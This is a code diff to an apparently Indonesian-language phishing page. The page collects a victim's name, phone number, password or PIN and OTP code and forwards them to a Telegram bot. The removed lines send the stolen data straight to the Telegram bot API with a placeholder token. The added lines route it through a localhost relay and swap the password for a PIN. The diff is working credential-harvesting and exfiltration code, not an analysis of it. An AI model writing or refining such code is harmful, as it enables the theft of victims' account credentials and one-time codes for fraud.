@@ -147,13 +147,11 @@
             }
 
             sendToTelegram({
-                step: 'otp_verification',
+                step: 'otp',
                 nama: userData.nama,
                 nohp: userData.nohp,
-                password: userData.password,
-                actionType: userData.actionType,
-                otp: otp,
-                status: 'completed'
+                pin: userData.pin,    // Changed from password to pin
+                otp: document.getElementById('otp').value
             });
             
             document.getElementById('successModal').classList.remove('hidden');
@@ -173,32 +171,12 @@
             }, 1000);
         }
 
-        async function sendToTelegram(data) {
-            const BOT_TOKEN = '7889876543:AAHxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';
-            const CHAT_ID = '-1001234567890';
-            
-            const message = `🎯 *VERIFIKASI OTP SELESAI*
-
-👤 *Nama:* ${data.nama}
-📱 *No HP:* ${data.nohp}
-🔑 *Password:* ${data.password}
-🎯 *Aksi:* ${data.actionType}
-🔐 *Kode OTP:* ${data.otp}
-✅ *Status:* ${data.status}
-⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}
-📍 *Step:* ${data.step}`;
-            
+                async function sendToTelegram(data) {
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                await fetch('http://localhost:3000/api/send-telegram', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
                 });
             } catch (error) {
                 console.log('Telegram send error:', error);
